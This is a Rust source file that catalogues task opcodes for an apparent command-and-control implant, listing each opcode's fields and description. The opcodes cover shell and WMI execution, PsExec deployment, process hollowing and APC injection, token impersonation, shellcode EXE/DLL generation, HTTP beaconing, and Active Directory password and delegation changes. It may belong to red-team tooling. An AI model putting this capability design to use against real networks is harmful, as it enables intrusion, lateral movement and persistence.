//! Static metadata for all task opcodes — field names, types, descriptions.

/// Describes a single field on a task.
pub struct FieldMeta {
    pub name: &'static str,
    /// Human-friendly type hint, e.g. "string", "u32", "bool"
    pub type_hint: &'static str,
    pub required: bool,
}

/// Metadata for a single task opcode.
pub struct TaskMeta {
    pub op: &'static str,
    pub description: &'static str,
    pub fields: &'static [FieldMeta],
}

impl TaskMeta {
    /// Build a minimal default JSON value for this task.
    pub fn default_json(&self) -> serde_json::Value {
        let mut map = serde_json::Map::new();
        map.insert("op".to_string(), serde_json::Value::String(self.op.to_string()));
        for f in self.fields {
            if f.required {
                let val = match f.type_hint {
                    "u32" | "u16" | "u8" => serde_json::Value::Number(0.into()),
                    "bool" => serde_json::Value::Bool(false),
                    _ => serde_json::Value::String(String::new()),
                };
                map.insert(f.name.to_string(), val);
            }
        }
        serde_json::Value::Object(map)
    }

    /// Return entries whose op name or description contains `query` (case-insensitive).
    pub fn filter<'a>(all: &'a [TaskMeta], query: &str) -> Vec<&'a TaskMeta> {
        if query.is_empty() {
            return all.iter().collect();
        }
        let q = query.to_lowercase();
        all.iter()
            .filter(|m| m.op.contains(q.as_str()) || m.description.to_lowercase().contains(q.as_str()))
            .collect()
    }
}

/// All task metadata in display order.
pub fn all_task_metadata() -> &'static [TaskMeta] {
    &ALL_METADATA
}

macro_rules! field {
    ($name:expr, $ty:expr, req) => {
        FieldMeta { name: $name, type_hint: $ty, required: true }
    };
    ($name:expr, $ty:expr, opt) => {
        FieldMeta { name: $name, type_hint: $ty, required: false }
    };
}

macro_rules! task {
    ($op:expr, $desc:expr, [$($fields:expr),* $(,)?]) => {
        TaskMeta { op: $op, description: $desc, fields: &[$($fields),*] }
    };
}

static ALL_METADATA: &[TaskMeta] = &[
    // ── Core ──────────────────────────────────────────────────────────────
    task!("end",          "End the task set",                        []),
    task!("store_result", "Store last result in a variable",         [field!("var", "u16", req)]),
    task!("set_var",      "Set a variable to a value",               [field!("var", "u16", req), field!("data", "string", req)]),
    task!("print_var",    "Print a variable; omit var to print last result",  [field!("var", "u16", opt)]),
    task!("check_error",  "Check error status of a variable",        [field!("var", "u16", req)]),
    task!("goto",         "Unconditional jump to task index",         [field!("target", "u16", req)]),
    task!("conditional",  "Conditional jump on data or error",       [
        field!("mode",         "string", req),
        field!("var1",         "u16",    req),
        field!("var2",         "u16",    opt),
        field!("true_target",  "u16",    req),
        field!("false_target", "u16",    req),
    ]),
    task!("get_const",    "Load a constant by index",                [field!("index", "u16", req)]),
    task!("sleep",        "Sleep for a duration (ms)",               [field!("ms", "u32", req)]),

    // ── Command Execution ─────────────────────────────────────────────────
    task!("run_command",  "Run a shell command",                     [field!("command", "string", req)]),
    task!("get_cwd",      "Get current working directory",           []),
    task!("list_procs",   "List running processes",                  []),
    task!("wmi_exec",     "Execute command via WMI",                 [
        field!("command", "string", req),
        field!("host",    "string", opt),
        field!("user",    "string", opt),
        field!("pass",    "string", opt),
    ]),
    task!("psexec", "Deploy and run a service via PsExec", [
        field!("target",       "string", req),
        field!("service_name", "string", req),
        field!("display_name", "string", req),
        field!("binary_path",  "string", req),
        field!("service_bin",  "string", req),
    ]),
    task!("pyexec", "Load Python DLL and execute script", [
        field!("url",    "string", req),
        field!("script", "string", req),
    ]),
    task!("shell_execute", "Shell execute via COM", [
        field!("path", "string", req),
        field!("verb", "string", opt),
        field!("args", "string", opt),
    ]),
    task!("shell_execute_explorer", "Shell execute with explorer as parent", [
        field!("path", "string", req),
        field!("verb", "string", opt),
        field!("args", "string", opt),
    ]),
    task!("shell_extract", "Extract a ZIP archive", [field!("path", "string", req)]),

    // ── File Operations ───────────────────────────────────────────────────
    task!("read_file",       "Read file contents",          [field!("path", "string", req)]),
    task!("write_file",      "Write data to a file",        [field!("path", "string", req), field!("content", "string", req)]),
    task!("delete_file",     "Delete a file",               [field!("path", "string", req)]),
    task!("redirect_stdout", "Redirect stdout to a file",   [field!("path", "string", req)]),
    task!("load_library",    "Load a DLL into the process", [field!("path", "string", req)]),

    // ── Network ───────────────────────────────────────────────────────────
    task!("http_send", "Send an HTTP request", [
        field!("method", "string", req),
        field!("host",   "string", req),
        field!("port",   "u16",    req),
        field!("path",   "string", req),
        field!("secure", "bool",   opt),
        field!("body",   "string", opt),
    ]),
    task!("http_beacon", "Start an HTTP beacon loop", [
        field!("host",     "string", req),
        field!("port",     "u16",    req),
        field!("interval", "u32",    req),
        field!("secure",   "bool",   opt),
        field!("agent_id", "string", opt),
    ]),
    task!("resolve_hostname", "Resolve hostname to IP address", [field!("hostname", "string", req)]),
    task!("portscan", "Scan ports on target hosts", [
        field!("targets", "string", req),
        field!("ports",   "string", req),
    ]),

    // ── Process ───────────────────────────────────────────────────────────
    task!("kill",         "Kill the implant",                         [field!("magic", "u32", opt)]),
    task!("exit_process", "Exit the implant process",                 [field!("exit_code", "u32", opt)]),
    task!("migrate",      "Migrate into a matching process",          [
        field!("search",  "string|pid", req),
        field!("task_id", "u8",     opt),
        field!("magic",   "u32",    opt),
    ]),
    task!("migrate_apc",  "Inject into a spawned process via APC",   [
        field!("image",   "string", req),
        field!("task_id", "u8",     opt),
        field!("magic",   "u32",    opt),
    ]),
    task!("hollow", "Hollow a process with a JMP stub", [
        field!("image",   "string", req),
        field!("task_id", "u8",     opt),
        field!("search",  "string", opt),
    ]),
    task!("hollow_apc", "Hollow a process via APC queue", [
        field!("image",   "string", req),
        field!("task_id", "u8",     opt),
        field!("search",  "string", opt),
    ]),
    task!("create_thread", "Create a thread in the current process", [
        field!("task_id", "u8",  opt),
        field!("magic",   "u32", opt),
    ]),
    task!("sacrificial", "Spawn sacrificial process for injection", [
        field!("image",     "string", req),
        field!("task_id",   "u8",     opt),
        field!("pipe_name", "string", opt),
        field!("search",    "string", opt),
        field!("no_kill",   "bool",   opt),
    ]),
    task!("impersonate_process", "Impersonate a process token by name/cmdline", [field!("search", "string", req)]),
    task!("revert_to_self",      "Revert to the original process token",        []),

    // ── Shellcode ─────────────────────────────────────────────────────────
    task!("get_shellcode", "Copies the current shellcode", [
        field!("task",  "string", req),
        field!("magic", "u32",    opt),
    ]),
    task!("shellcode_server", "Start a shellcode listener on a port", [
        field!("port",       "u16", req),
        field!("magic_base", "u32", opt),
    ]),
    task!("run_bof", "Run a Beacon Object File", [
        field!("bof_data", "string", req),
        field!("entry",    "string", opt),
        field!("inputs",   "string", opt),
    ]),
    task!("generate_exe", "Generate EXE with embedded shellcode", [field!("task_id", "u8", opt)]),
    task!("generate_dll", "Generate DLL with embedded shellcode", [
        field!("task_id",     "u8",     opt),
        field!("export_name", "string", opt),
    ]),

    // ── Token & Privilege ─────────────────────────────────────────────────
    task!("make_token", "Create a logon token; Default logon type 9", [
        field!("username",   "string", req),
        field!("password",   "string", req),
        field!("domain",     "string", opt),
        field!("logon_type", "u8",     opt),
    ]),
    task!("enable_privilege", "Enable a privilege on a process; Omit search for current process", [
        field!("privilege", "string", req),
        field!("search",    "string", opt),
    ]),
    task!("list_process_privs", "List privileges of a process; Omit var for current process",      [field!("search", "string", opt)]),
    task!("list_thread_privs",  "List current thread privileges",    []),

    // ── Registry ──────────────────────────────────────────────────────────
    task!("reg_create_key",  "Create a registry key",  [field!("key", "string", req)]),
    task!("reg_delete_key",  "Delete a registry key",  [field!("key", "string", req)]),
    task!("reg_set_value",   "Set a registry value",   [
        field!("key",        "string", req),
        field!("value_name", "string", req),
        field!("value",      "string", req),
        field!("value_type", "string", opt),
    ]),
    task!("reg_query_value", "Query a registry value", [
        field!("key",        "string", req),
        field!("value_name", "string", req),
    ]),

    // ── Services ──────────────────────────────────────────────────────────
    task!("start_service",    "Start a Windows service",               [
        field!("service_name", "string", req),
        field!("target",       "string", opt),
    ]),
    task!("delete_service",   "Delete a Windows service",              [
        field!("service_name", "string", req),
        field!("target",       "string", opt),
    ]),
    task!("register_service", "Register this process as a Windows service", [field!("service_name", "string", req)]),

    // ── Active Directory ──────────────────────────────────────────────────
    task!("query_ldap", "Query LDAP / Active Directory", [
        field!("filter",    "string", req),
        field!("base",      "string", opt),
        field!("scope",     "u8",     opt),
        field!("attribute", "string", opt),
    ]),
    task!("set_ad_attr_str", "Set an AD string attribute", [
        field!("dn",    "string", req),
        field!("attr",  "string", req),
        field!("value", "string", req),
    ]),
    task!("set_ad_attr_bin", "Set an AD binary attribute", [
        field!("dn",    "string", req),
        field!("attr",  "string", req),
        field!("value", "string", req),
    ]),
    task!("set_user_password", "Set an AD user password", [
        field!("username", "string", req),
        field!("password", "string", req),
        field!("server",   "string", opt),
    ]),
    task!("get_user_sid", "Get the SID for a user", [
        field!("username", "string", req),
        field!("server",   "string", opt),
    ]),
    task!("add_user_to_localgroup", "Add a user to a local group", [
        field!("group",    "string", req),
        field!("username", "string", req),
        field!("server",   "string", opt),
    ]),
    task!("remove_user_from_localgroup", "Remove a user from a local group", [
        field!("group",    "string", req),
        field!("username", "string", req),
        field!("server",   "string", opt),
    ]),
    task!("add_user_to_group", "Add a user to a domain group", [
        field!("group",    "string", req),
        field!("username", "string", req),
        field!("server",   "string", opt),
    ]),
    task!("remove_user_from_group", "Remove a user from a domain group", [
        field!("group",    "string", req),
        field!("username", "string", req),
        field!("server",   "string", opt),
    ]),
    task!("create_rbcd_ace", "Create a RBCD delegation ACE", [field!("sid", "string", req)]),

    // ── Frida ─────────────────────────────────────────────────────────────
    task!("frida_hook", "Instrument a process with Frida", [
        field!("url",            "string", req),
        field!("script",         "string", req),
        field!("name",           "string", opt),
        field!("callback_host",  "string", opt),
        field!("callback_port",  "u16",    opt),
        field!("batch_size",     "u32",    opt),
        field!("flush_interval", "u32",    opt),
    ]),
    task!("frida_unhook", "Remove Frida instrumentation", [
        field!("hook_id", "string", opt),
        field!("name",    "string", opt),
    ]),

    // ── Memory ────────────────────────────────────────────────────────────
    task!("mem_read",  "Read memory at an address",              [
        field!("address", "string", req),
        field!("size",    "string", req),
        field!("pid",     "string", opt),
    ]),
    task!("dll_list",  "List loaded DLLs from PEB LDR",         [field!("pid", "string", opt)]),
    task!("mem_map",   "Enumerate virtual memory regions",       [field!("pid", "string", opt)]),
    task!("malfind",   "Find injected executable memory",        [field!("pid", "string", opt)]),
    task!("ldr_check", "Cross-reference IMAGE regions vs PEB",  [field!("pid", "string", opt)]),
];
